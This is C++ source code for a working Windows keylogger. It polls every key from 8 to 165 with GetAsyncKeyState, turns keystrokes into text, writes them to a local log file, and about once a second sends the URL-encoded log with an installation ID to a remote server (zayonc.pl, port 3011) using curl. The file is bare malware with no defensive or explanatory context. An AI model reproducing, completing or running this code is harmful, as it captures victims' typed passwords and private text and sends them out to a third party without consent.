#include <Windows.h>
#include <string>
#include <iostream>
#include <fstream>
#include <cctype>
#include <iomanip>
#include <sstream>
#include <ctime>
#include <thread> 


using namespace std;


void save(string input) {
	cout << input << ", ";
	fstream LogFile;
	LogFile.open("local.log", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

void save(char input) {
	string str = "";
	str += input;
	save(str);
}


string readID() {
	string id = "";
	try
	{
		ifstream idFile("id.txt");
		if (idFile.is_open()) {
			idFile >> id;
			idFile.close();
		}
	}
	catch (const std::exception&)
	{
		id = "";
	}
	return id;
}


string parseUnprintable(int S_key) {
	switch (S_key) {
	case VK_SPACE:
		return " ";
	case VK_RETURN:
		return "#ENTER#";
	case VK_SHIFT:
		return "#SHIFT#";	
	case VK_RSHIFT:
		return "#RSHIFT#";
	case VK_CONTROL:
		return "#CONTROL#";
	case VK_MENU:
		return "#ALT#";
	case VK_BACK:
		return "#BACK#";
	case VK_RBUTTON:
		return "#R_CLICK#";
	case VK_CAPITAL:
		return "#CAPS#";
	case VK_TAB:
		return "#TAB#";
	case VK_UP:
		return "#UP#";
	case VK_DOWN:
		return "#DOWN#";
	case VK_LEFT:
		return "#LEFT#";
	case VK_RIGHT:
		return "#RIGHT#";
	default: 
		return "";
	}
}


string parseToString(char key) {

	string parsed = parseUnprintable(key);

	if (parsed != "")
		return parsed;
	else if (key >= 48 && key <= 90)
		parsed += key;
	else if (key >= 96 && key <= 105)
		parsed += (key - 48);
	else if (key >= 112 && key <= 123) {
		parsed += "#F";

		if (key <= 120)
			parsed += (key - 63);
		else {
			parsed += '1';
			parsed += (key - 73);
		}
		parsed += '#';
	}

	return parsed;
}


string url_encode(const string& value) {
	ostringstream escaped;
	escaped.fill('0');
	escaped << hex;

	for (string::const_iterator i = value.begin(), n = value.end(); i != n; ++i) {
		string::value_type c = (*i);

		if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
			escaped << c;
			continue;
		}

		escaped << uppercase;
		escaped << '%' << setw(2) << int((unsigned char)c);
		escaped << nouppercase;
	}

	return escaped.str();
}


void tryToSend(string* log, string id) {

	string beforeIsSend = *log;
	string req = "curl \"http://zayonc.pl:3011/log?";
	req += "id=" + id + "&";
	req += "log=" + url_encode(beforeIsSend) + '\"';

	cout << req << "\n";

	if (!system(req.c_str())) {

		int from = beforeIsSend.length();
		int to = log->length();

		*log = log->substr(0, log->length() - beforeIsSend.length());
	}
}


int main()
{
	ShowWindow(GetConsoleWindow(), SW_SHOW);

	string log = "";
	string installationID = readID();

	time_t lastUpdate;
	time(&lastUpdate);

	while (true) {
		Sleep(4);
		for (unsigned char key = 8; key <= 165; key++)
		{
			if (GetAsyncKeyState(key) == -32767) {

				if (log == "")
					time(&lastUpdate);

				save(parseToString(key));
				log += parseToString(key);
			}
		}

		if (log != "" && time(NULL) - lastUpdate >= 1) {
			thread th(tryToSend, &log, installationID);
			th.detach();
			time(&lastUpdate);
		}

	}

	return 0;
}
